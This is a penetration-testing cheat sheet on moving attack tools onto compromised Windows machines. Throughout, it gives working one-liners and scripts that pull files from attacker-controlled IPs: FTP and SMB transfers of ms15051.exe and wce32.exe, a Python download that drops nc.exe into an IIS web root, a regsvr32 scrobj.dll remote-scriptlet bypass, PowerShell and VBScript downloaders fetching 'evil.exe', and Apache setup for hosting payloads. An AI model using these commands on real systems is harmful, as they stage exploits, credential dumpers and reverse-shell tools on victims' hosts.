# File Transfers

### Python webserver host

`python -m SimpleHTTPServer 80`

### Python ftp host

`python -m pyftpdlib -p 21`

### FTP non-interactive

`echo open 10.11.14.32 21> ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET ms15051.exe>> ftp.txt echo bye>> ftp.txt ftp -v -n -s:ftp.txt`

## SMB Server \(Impacket\) 

```bash
# mount current directory `.` to smb share name `a`
smbserver.py a .

# to copy eg. in windows
copy \\192.168.1.100\a\wce32.exe .

# execute exe using smb share
\\192.168.1.100\a\whoami.exe
```

## Python file transfer

`c:\python26\python.exe -c "from urllib import urlretrieve; urlretrieve('`[`http://10.11.0.69/nc.exe`](http://10.11.0.69/nc.exe)`', 'C:\Inetpub\wwwroot\nc.exe')"`

### Windows Server 1-liner

`regsvr32 /u /n /s /i:`[`http://192.168.1.10:443/payload.sct`](http://ip:port/payload.sct) `scrobj.dll`

## Powershell wget script

```bash
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

### VB downloader script

```bash
#Windows downloader script using VB
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# To Download using script
cscript wget.vbs http://10.11.0.5/37.exe evil.exe
```

### Apache Webserver

```bash
# Edit port used 'Listen <Port>'
vim /etc/apache2/ports.conf

# Create folder to share
mkdir /var/www/html/share

#chmod
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share

#move file to webserver root
mv /root/Desktop/evil.exe /var/www/html/share

#start 
service apache2 start
```


